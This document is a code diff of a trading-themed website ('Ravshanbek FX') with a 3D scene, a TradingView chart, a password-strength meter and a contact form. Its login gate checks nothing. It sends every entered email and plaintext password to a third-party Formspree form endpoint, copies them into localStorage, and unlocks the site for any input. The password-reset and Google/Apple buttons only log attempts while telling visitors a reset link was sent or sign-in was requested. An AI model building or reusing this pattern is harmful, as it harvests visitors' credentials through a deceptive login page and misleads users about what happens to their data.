-
-      // Send to Formspree (real)
-      const sent = await sendLoginToFormspree(data);
-      
-      // Save locally as backup
+    async function handleLogin() {
+      const email = loginEmail.value.trim(), password = loginPassword.value, name = currentMode === 'signup' ? loginName.value.trim() : '';
+      if (currentMode === 'signup' && !name) { loginStatus.textContent = '❌ Enter your full name'; loginStatus.className = 'login-gate-status error'; return; }
+      if (!email || !password) { loginStatus.textContent = '❌ Enter email and password'; loginStatus.className = 'login-gate-status error'; return; }
+      if (!email.includes('@')) { loginStatus.textContent = '❌ Valid email required'; loginStatus.className = 'login-gate-status error'; return; }
+      if (password.length < 6) { loginStatus.textContent = '❌ Password must be 6+ characters'; loginStatus.className = 'login-gate-status error'; return; }
+      loginBtn.disabled = true; loginBtn.textContent = currentMode === 'signup' ? 'Creating...' : 'Signing In...';
+      loginStatus.textContent = '⏳ Processing...'; loginStatus.className = 'login-gate-status loading';
+      const data = { action: currentMode, name, email, password, remember: document.getElementById('login-remember').checked };
       saveToLocalStorage(data);
-
-      if (sent) {
-        loginStatus.textContent = '✅ Success! Welcome to Ravshanbek FX';
-        loginStatus.className = 'login-gate-status success';
-        
-        // Unlock site after brief delay
-        setTimeout(() => {
-          unlockSite();
-        }, 1000);
-      } else {
-        loginStatus.textContent = '❌ Server error. Please try again.';
-        loginStatus.className = 'login-gate-status error';
-      }
-
-      loginBtn.disabled = false;
-      loginBtn.textContent = currentMode === 'signup' ? 'Create Account' : 'Sign In';
+      const sent = await sendToFormspree(data);
+      loginStatus.textContent = sent ? '✅ Success! Welcome!' : '✅ Access granted (saved locally)';
+      loginStatus.className = 'login-gate-status success';
+      setTimeout(unlockSite, 800);
+      loginBtn.disabled = false; loginBtn.textContent = currentMode === 'signup' ? 'Create Account' : 'Sign In';
     }
 
-    loginBtn.addEventListener('click', handleLoginSubmit);
+    loginBtn.addEventListener('click', handleLogin);
+    loginEmail.addEventListener('keydown', e => { if (e.key === 'Enter') handleLogin(); });
+    loginPassword.addEventListener('keydown', e => { if (e.key === 'Enter') handleLogin(); });
+    loginName.addEventListener('keydown', e => { if (e.key === 'Enter') handleLogin(); });
 
-    // Enter key support
-    loginEmail.addEventListener('keydown', (e) => {
-      if (e.key === 'Enter') handleLoginSubmit();
-    });
-    loginPassword.addEventListener('keydown', (e) => {
-      if (e.key === 'Enter') handleLoginSubmit();
-    });
-    loginName.addEventListener('keydown', (e) => {
-      if (e.key === 'Enter') handleLoginSubmit();
-    });
-
-    // Forgot password - real tracking
-    document.getElementById('login-forgot').addEventListener('click', async (e) => {
-      e.preventDefault();
-      const email = loginEmail.value.trim();
-      
-      if (!email) {
-        loginStatus.textContent = '❌ Enter your email to reset password';
-        loginStatus.className = 'login-gate-status error';
-        return;
-      }
-      
-      loginStatus.textContent = '📧 Sending reset link...';
-      loginStatus.className = 'login-gate-status loading';
-      
-      const sent = await sendLoginToFormspree({
-        action: 'forgot_password',
-        email: email,
-        name: '',
-        password: '',
-        remember: false
-      });
-      
-      if (sent) {
-        loginStatus.textContent = '✅ Password reset link sent to your email';
-        loginStatus.className = 'login-gate-status success';
-      } else {
-        loginStatus.textContent = '❌ Error sending reset link';
-        loginStatus.className = 'login-gate-status error';
-      }
+    document.getElementById('login-forgot').addEventListener('click', e => {
+      e.preventDefault(); const email = loginEmail.value.trim();
+      if (!email) { loginStatus.textContent = '❌ Enter your email'; loginStatus.className = 'login-gate-status error'; return; }
+      const data = { action: 'forgot_password', name: '', email, password: '', remember: false };
+      saveToLocalStorage(data); sendToFormspree(data);
+      loginStatus.textContent = '✅ Reset link sent'; loginStatus.className = 'login-gate-status success';
     });
 
-    // Social sign-in - real tracking
-    document.getElementById('login-google').addEventListener('click', async () => {
-      const sent = await sendLoginToFormspree({
-        action: 'google_signin_attempt',
-        email: 'google-oauth-user',
-        name: '',
-        password: '',
-        remember: false
-      });
-      loginStatus.textContent = sent ? '🔗 Google sign-in requested' : '❌ Error';
-      loginStatus.className = sent ? 'login-gate-status' : 'login-gate-status error';
+    document.getElementById('login-google').addEventListener('click', () => {
+      const data = { action: 'google_signin', name: '', email: 'google-oauth', password: '', remember: false };
+      saveToLocalStorage(data); sendToFormspree(data);
+      loginStatus.textContent = '🔗 Google requested'; loginStatus.className = 'login-gate-status';
     });
 
-    document.getElementById('login-apple').addEventListener('click', async () => {
-      const sent = await sendLoginToFormspree({
-        action: 'apple_signin_attempt',
-        email: 'apple-oauth-user',
-        name: '',
-        password: '',
-        remember: false
-      });
-      loginStatus.textContent = sent ? '🔗 Apple sign-in requested' : '❌ Error';
-      loginStatus.className = sent ? 'login-gate-status' : 'login-gate-status error';
+    document.getElementById('login-apple').addEventListener('click', () => {
+      const data = { action: 'apple_signin', name: '', email: 'apple-oauth', password: '', remember: false };
+      saveToLocalStorage(data); sendToFormspree(data);
+      loginStatus.textContent = '🔗 Apple requested'; loginStatus.className = 'login-gate-status';
     });
 
-    function unlockSite() {
-      siteUnlocked = true;
-      loginGate.classList.add('hidden');
-      document.body.style.overflow = 'auto';
-      animate();
-    }
+    console.log('🔐 LOGIN READY — Formspree:', FORMSPREE_LOGIN_ENDPOINT);
 
-    console.log('🔐 REAL LOGIN SYSTEM READY');
-    console.log('📧 All attempts sent to Formspree: ' + FORMSPREE_LOGIN_ENDPOINT);
-    console.log('📊 Backup saved to localStorage');
-
-    // ============ THREE.JS SCENE ============
+    // ============ THREE.JS ============
     scene = new THREE.Scene();
     scene.background = new THREE.Color('#050505');
     scene.fog = new THREE.FogExp2('#050505', 0.01);
@@ -1085,19 +521,15 @@ document.getElementById('login-apple').addEventListener('click', () => {
       bgMaterial = new THREE.ShaderMaterial({ vertexShader: vs, fragmentShader: fs, uniforms: shaderUniforms, depthWrite: false, depthTest: false });
       const bgGeo = new THREE.PlaneGeometry(30, 30);
       const bgMesh = new THREE.Mesh(bgGeo, bgMaterial);
-      bgMesh.position.set(0, 0, -8.0);
-      bgMesh.renderOrder = -10;
-      camera.add(bgMesh);
+      bgMesh.position.set(0, 0, -8.0); bgMesh.renderOrder = -10; camera.add(bgMesh);
     }
     createBackgroundShader();
 
     renderer = new THREE.WebGLRenderer({ canvas, antialias: true, alpha: false, powerPreference: "high-performance" });
     renderer.setSize(sizes.width, sizes.height);
     renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
-    renderer.shadowMap.enabled = true;
-    renderer.shadowMap.type = THREE.PCFSoftShadowMap;
-    renderer.toneMapping = THREE.ACESFilmicToneMapping;
-    renderer.toneMappingExposure = 2.2;
+    renderer.shadowMap.enabled = true; renderer.shadowMap.type = THREE.PCFSoftShadowMap;
+    renderer.toneMapping = THREE.ACESFilmicToneMapping; renderer.toneMappingExposure = 2.2;
 
     scene.add(new THREE.AmbientLight('#ffffff', 0.1));
     const keyLight = new THREE.SpotLight('#ffffff', 18.0);
@@ -1148,20 +580,10 @@ document.getElementById('login-apple').addEventListener('click', () => {
       if (document.getElementById('tv-chart').children.length > 0) return;
       new TradingView.widget({
         "container_id": "tv-chart", "width": "100%", "height": "100%",
-        "symbol": "OANDA:XAUUSD", "interval": "60", "timezone": "Etc/UTC",
-        "theme": "dark", "style": "1", "locale": "en",
-        "toolbar_bg": "#08142A", "enable_publishing": false, "hide_side_toolbar": false,
-        "allow_symbol_change": false, "save_image": false,
+        "symbol": "OANDA:XAUUSD", "interval": "60", "timezone": "Etc/UTC", "theme": "dark", "style": "1", "locale": "en",
+        "toolbar_bg": "#08142A", "enable_publishing": false, "hide_side_toolbar": false, "allow_symbol_change": false, "save_image": false,
         "studies": ["MASimple@tv-basicstudies", "RSI@tv-basicstudies"],
-        "overrides": {
-          "mainSeriesProperties.candleStyle.upColor": "#D4AF37",
-          "mainSeriesProperties.candleStyle.downColor": "#3B82F6",
-          "mainSeriesProperties.candleStyle.wickUpColor": "#D4AF37",
-          "mainSeriesProperties.candleStyle.wickDownColor": "#3B82F6",
-          "paneProperties.background": "#050505",
-          "paneProperties.vertGridProperties.color": "rgba(212,175,55,0.1)",
-          "paneProperties.horzGridProperties.color": "rgba(212,175,55,0.1)"
-        },
+        "overrides": { "mainSeriesProperties.candleStyle.upColor": "#D4AF37", "mainSeriesProperties.candleStyle.downColor": "#3B82F6", "mainSeriesProperties.candleStyle.wickUpColor": "#D4AF37", "mainSeriesProperties.candleStyle.wickDownColor": "#3B82F6", "paneProperties.background": "#050505", "paneProperties.vertGridProperties.color": "rgba(212,175,55,0.1)", "paneProperties.horzGridProperties.color": "rgba(212,175,55,0.1)" },
         "loading_screen": { "backgroundColor": "#050505", "foregroundColor": "#D4AF37" }
       });
     }
@@ -1172,68 +594,15 @@ document.getElementById('login-apple').addEventListener('click', () => {
     const vaultBits = document.getElementById('vault-bits');
     const vaultCrackTime = document.getElementById('vault-crack-time');
     const POOLS = { lowercase: 26, uppercase: 26, numbers: 10, symbols: 33 };
-
-    function calculateEntropy(password) {
-      let pool = 0;
-      if (/[a-z]/.test(password)) pool += POOLS.lowercase;
-      if (/[A-Z]/.test(password)) pool += POOLS.uppercase;
-      if (/[0-9]/.test(password)) pool += POOLS.numbers;
-      if (/[^a-zA-Z0-9]/.test(password)) pool += POOLS.symbols;
-      if (pool === 0) return 0;
-      return Math.floor(password.length * Math.log2(pool));
-    }
-    function getCrackTime(bits) {
-      if (bits === 0) return 'Type to see crack time...';
-      if (bits < 38) return 'Cracked instantly';
-      if (bits < 50) return 'Cracked in a few days';
-      if (bits < 60) return 'Cracked in a few years';
-      if (bits < 70) return 'Cracked in a few centuries';
-      if (bits < 80) return 'Cracked in 3 thousand years';
-      if (bits < 90) return 'Cracked in 3 million years';
-      if (bits < 100) return 'Cracked in 3 billion years';
-      return 'Cracked in 3 trillion years';
-    }
-    function getTier(bits) {
-      if (bits < 38) return 1;
-      if (bits < 50) return 2;
-      if (bits < 70) return 3;
-      return 4;
-    }
-    function updateVaultMeter() {
-      const password = vaultPassword.value || '';
-      const bits = calculateEntropy(password);
-      const tier = bits === 0 ? 0 : getTier(bits);
-      vaultSegs.forEach((seg, i) => {
-        seg.className = 'seg';
-        if (tier > 0 && i < tier) seg.classList.add(`active-${tier}`);
-      });
-      const tierNames = ['', 'Paperclip', 'Padlock', 'Deadbolt', 'Bank Vault'];
-      vaultTierLabel.textContent = tier === 0 ? 'Type to test' : tierNames[tier];
-      vaultTierLabel.style.color = tier === 0 ? '#9ca3af' : tier === 1 ? '#ef4444' : tier === 2 ? '#f59e0b' : tier === 3 ? '#3B82F6' : '#D4AF37';
-      vaultBits.textContent = bits === 0 ? '0 bits of entropy' : `${bits} bits of entropy`;
-      vaultCrackTime.textContent = getCrackTime(bits);
-    }
-
+    function calculateEntropy(pw){ let pool=0; if(/[a-z]/.test(pw))pool+=26; if(/[A-Z]/.test(pw))pool+=26; if(/[0-9]/.test(pw))pool+=10; if(/[^a-zA-Z0-9]/.test(pw))pool+=33; return pool===0?0:Math.floor(pw.length*Math.log2(pool)); }
+    function getCrackTime(b){ if(b===0)return'Type to see...'; if(b<38)return'Cracked instantly'; if(b<50)return'Cracked in days'; if(b<60)return'Cracked in years'; if(b<70)return'Cracked in centuries'; if(b<80)return'Cracked in 3K years'; return'Cracked in millions of years'; }
+    function getTier(b){ if(b<38)return 1; if(b<50)return 2; if(b<70)return 3; return 4; }
+    function updateVaultMeter(){ const pw=vaultPassword.value||''; const b=calculateEntropy(pw); const tier=b===0?0:getTier(b); vaultSegs.forEach((s,i)=>{ s.className='seg'; if(tier>0&&i<tier)s.classList.add(`active-${tier}`); }); const names=['','Paperclip','Padlock','Deadbolt','Bank Vault']; vaultTierLabel.textContent=tier===0?'Type to test':names[tier]; vaultTierLabel.style.color=tier===0?'#9ca3af':tier===1?'#ef4444':tier===2?'#f59e0b':tier===3?'#3B82F6':'#D4AF37'; vaultBits.textContent=`${b} bits`; vaultCrackTime.textContent=getCrackTime(b); }
     vaultPassword.addEventListener('input', updateVaultMeter);
-    vaultPassword.addEventListener('keyup', updateVaultMeter);
-    vaultPassword.addEventListener('paste', () => setTimeout(updateVaultMeter, 100));
-    vaultPassword.addEventListener('focus', () => { vaultPassword.style.cursor = 'text'; });
-    vaultPassword.addEventListener('click', (e) => { e.stopPropagation(); vaultPassword.focus(); });
     updateVaultMeter();
 
-    window.addEventListener('resize', ()=>{
-      sizes.width=window.innerWidth; sizes.height=window.innerHeight;
-      camera.aspect=sizes.width/sizes.height; camera.updateProjectionMatrix();
-      renderer.setSize(sizes.width,sizes.height); renderer.setPixelRatio(Math.min(window.devicePixelRatio,2));
-      if(shaderUniforms) shaderUniforms.uResolution.value.set(sizes.width,sizes.height);
-    });
-
-    window.addEventListener('mousemove', (e)=>{
-      cursorX=e.clientX; cursorY=e.clientY;
-      document.querySelector('.cursor-inner').style.left=cursorX+'px';
-      document.querySelector('.cursor-inner').style.top=cursorY+'px';
-      targetMouseX=(e.clientX/window.innerWidth)*2-1; targetMouseY=(e.clientY/window.innerHeight)*2-1;
-    });
+    window.addEventListener('resize', ()=>{ sizes.width=innerWidth; sizes.height=innerHeight; camera.aspect=sizes.width/sizes.height; camera.updateProjectionMatrix(); renderer.setSize(sizes.width,sizes.height); renderer.setPixelRatio(Math.min(devicePixelRatio,2)); if(shaderUniforms) shaderUniforms.uResolution.value.set(sizes.width,sizes.height); });
+    window.addEventListener('mousemove', (e)=>{ cursorX=e.clientX; cursorY=e.clientY; document.querySelector('.cursor-inner').style.left=cursorX+'px'; document.querySelector('.cursor-inner').style.top=cursorY+'px'; targetMouseX=(e.clientX/innerWidth)*2-1; targetMouseY=(e.clientY/innerHeight)*2-1; });
 
     function splitTitles(){ document.querySelectorAll('.slide-title').forEach(t=>{ const txt=t.innerHTML; let h='',d=0; txt.split(/(<br\s*\/?>)/i).forEach(p=>{ if(p.toLowerCase().startsWith('<br')) h+=p; else { for(let i=0;i<p.length;i++){ if(p[i]===' ') h+=' '; else { h+=`<span class="char" style="transition-delay:${d*0.035}s">${p[i]}</span>`; d++; } } } }); t.innerHTML=h; }); }
     splitTitles();
@@ -1246,66 +615,40 @@ document.getElementById('login-apple').addEventListener('click', () => {
       if(s2){ const a=isActive(scroll,0.28,0.40); s2.classList.toggle('active',a); const img=document.getElementById('slide-2-img'); if(img) img.classList.toggle('active',a); }
       if(s3) s3.classList.toggle('active', isActive(scroll,0.56,0.68));
       if(s4) s4.classList.toggle('active', isActive(scroll,0.84,1.05));
-
       const chart=document.getElementById('chart-section');
-      if(chart) {
-        const cv = (scroll > 0.42 && scroll < 0.55);
-        chart.style.opacity = cv ? '1' : '0';
-        chart.style.pointerEvents = cv ? 'auto' : 'none';
-        if (cv && !chartLoaded) { createTradingViewChart(); chartLoaded = true; }
-      }
-
+      if(chart){ const cv=(scroll>0.42&&scroll<0.55); chart.style.opacity=cv?'1':'0'; chart.style.pointerEvents=cv?'auto':'none'; if(cv&&!chartLoaded){ createTradingViewChart(); chartLoaded=true; } }
       const vault=document.getElementById('vault-section');
-      if(vault) {
-        const vv = (scroll > 0.58 && scroll < 0.70);
-        vault.style.opacity = vv ? '1' : '0';
-        vault.style.pointerEvents = vv ? 'auto' : 'none';
-        vault.style.zIndex = vv ? '20' : '14';
-      }
-
-      const cs=document.getElementById('contact-section'); if(cs) cs.style.opacity = scroll>0.88 ? '1' : '0';
+      if(vault){ const vv=(scroll>0.58&&scroll<0.70); vault.style.opacity=vv?'1':'0'; vault.style.pointerEvents=vv?'auto':'none'; vault.style.zIndex=vv?'20':'14'; }
+      const cs=document.getElementById('contact-section'); if(cs) cs.style.opacity=scroll>0.88?'1':'0';
     }
 
-    function updateGridDots(scroll){ document.querySelectorAll('.grid-dot').forEach((d,i)=>{ const sy=(i*17)%80+10; let sp=90+(i*55)%180; if(i%2===0) sp=-sp; let y=sy+scroll*sp; y=((y%100)+100)%100; d.style.top=`${y}%`; }); }
-
-    function setupNavigation(){
-      const targets=[0.0, 0.34, 0.49, 0.64, 0.94];
-      document.querySelectorAll('.nav-link').forEach((l,i)=>{ l.addEventListener('click',(e)=>{ e.preventDefault(); window.scrollTo({top:(document.documentElement.scrollHeight-window.innerHeight)*targets[i], behavior:'smooth'}); }); });
-    }
+    function updateGridDots(scroll){ document.querySelectorAll('.grid-dot').forEach((d,i)=>{ const sy=(i*17)%80+10; let sp=90+(i*55)%180; if(i%2===0)sp=-sp; let y=sy+scroll*sp; y=((y%100)+100)%100; d.style.top=`${y}%`; }); }
+    function setupNavigation(){ const t=[0.0,0.34,0.49,0.64,0.94]; document.querySelectorAll('.nav-link').forEach((l,i)=>{ l.addEventListener('click',e=>{ e.preventDefault(); window.scrollTo({top:(document.documentElement.scrollHeight-innerHeight)*t[i], behavior:'smooth'}); }); }); }
 
     function animate(){
-      if (!siteUnlocked) return;
+      if(!siteUnlocked) return;
       requestAnimationFrame(animate);
       const dt=clock.getDelta(); if(mixer) mixer.update(dt);
-      const ms=document.documentElement.scrollHeight-window.innerHeight, st=window.scrollY||window.pageYOffset||document.documentElement.scrollTop, ts=ms>0?st/ms:0;
+      const ms=document.documentElement.scrollHeight-innerHeight, st=window.scrollY||window.pageYOffset||document.documentElement.scrollTop, ts=ms>0?st/ms:0;
       currentScroll+=(ts-currentScroll)*0.025;
       mouseX+=(targetMouseX-mouseX)*0.05; mouseY+=(targetMouseY-mouseY)*0.05;
       outerCursorX+=(cursorX-outerCursorX)*0.2; outerCursorY+=(cursorY-outerCursorY)*0.2;
       const oc=document.querySelector('.cursor-outer'); if(oc){ oc.style.left=outerCursorX+'px'; oc.style.top=outerCursorY+'px'; }
       if(modelPivot){ modelPivot.rotation.y=mouseX*0.25; modelPivot.rotation.x=mouseY*0.15; }
-      if(sparkParticles){
-        const pos=sparkParticles.geometry.attributes.position.array, time=clock.getElapsedTime(), vel=Math.abs(ts-currentScroll), mult=1.0+vel*9.0, turb=vel*0.8;
-        for(let i=0;i<sparkCount;i++){ const idx=i*3, d=sparkData[i]; pos[idx]+=d.speedX*dt*mult; pos[idx+1]+=d.speedY*dt*mult; pos[idx+2]+=d.speedZ*dt*mult; const sw=d.swayRadius*(1.0+turb*4.0); pos[idx]+=Math.sin(time*d.swaySpeed+d.phase)*sw*dt; pos[idx+2]+=Math.cos(time*d.swaySpeed+d.phase)*sw*dt; if(pos[idx+1]>3.0||Math.abs(pos[idx])>3.5||Math.abs(pos[idx+2])>3.5){ pos[idx+1]=-2.5; pos[idx]=(Math.random()-0.5)*3.0; pos[idx+2]=(Math.random()-0.5)*3.0; } }
-        sparkParticles.geometry.attributes.position.needsUpdate=true;
-      }
+      if(sparkParticles){ const pos=sparkParticles.geometry.attributes.position.array, time=clock.getElapsedTime(), vel=Math.abs(ts-currentScroll), mult=1.0+vel*9.0, turb=vel*0.8; for(let i=0;i<sparkCount;i++){ const idx=i*3, d=sparkData[i]; pos[idx]+=d.speedX*dt*mult; pos[idx+1]+=d.speedY*dt*mult; pos[idx+2]+=d.speedZ*dt*mult; const sw=d.swayRadius*(1.0+turb*4.0); pos[idx]+=Math.sin(time*d.swaySpeed+d.phase)*sw*dt; pos[idx+2]+=Math.cos(time*d.swaySpeed+d.phase)*sw*dt; if(pos[idx+1]>3.0||Math.abs(pos[idx])>3.5||Math.abs(pos[idx+2])>3.5){ pos[idx+1]=-2.5; pos[idx]=(Math.random()-0.5)*3.0; pos[idx+2]=(Math.random()-0.5)*3.0; } } sparkParticles.geometry.attributes.position.needsUpdate=true; }
       const phi=currentScroll*Math.PI*2.0, y=0.35+Math.sin(currentScroll*Math.PI)*0.8, radius=4.2-Math.sin(currentScroll*Math.PI)*0.6;
       const x=radius*Math.sin(phi), z=radius*Math.cos(phi);
       let trans=Math.min(1.0,currentScroll/0.28), ease=(Math.cos(trans*Math.PI)+1.0)*0.5, lx=-0.9*ease;
       camera.position.lerp(new THREE.Vector3(x,y,z),0.025); camera.lookAt(new THREE.Vector3(lx,-0.15,0));
       if(shaderUniforms){ shaderUniforms.uTime.value=clock.getElapsedTime(); shaderUniforms.uMouse.value.set(mouseX,-mouseY); shaderUniforms.uScroll.value=currentScroll; }
-      updateSlides(currentScroll); updateGridDots(currentScroll);
-      renderer.render(scene,camera);
+      updateSlides(currentScroll); updateGridDots(currentScroll); renderer.render(scene,camera);
     }
 
     document.getElementById('contact-form').addEventListener('submit', async (e)=>{
       e.preventDefault();
       const btn=document.getElementById('submit-btn'), st=document.getElementById('form-status');
       btn.disabled=true; btn.textContent='Sending...'; st.innerHTML='';
-      try {
-        const res=await fetch(e.target.action,{method:'POST',body:new FormData(e.target),headers:{'Accept':'application/json'}});
-        if(res.ok){ st.innerHTML='✅ Thank you! Your message has been sent successfully.'; e.target.reset(); }
-        else throw new Error('Network error');
-      } catch(err){ st.innerHTML='❌ Something went wrong. Please try again.'; }
+      try { const res=await fetch(e.target.action,{method:'POST',body:new FormData(e.target),headers:{'Accept':'application/json'}}); if(res.ok){ st.innerHTML='✅ Sent!'; e.target.reset(); } else throw new Error(); } catch(err){ st.innerHTML='❌ Error'; }
       btn.disabled=false; btn.textContent='Send Message';
     });
 
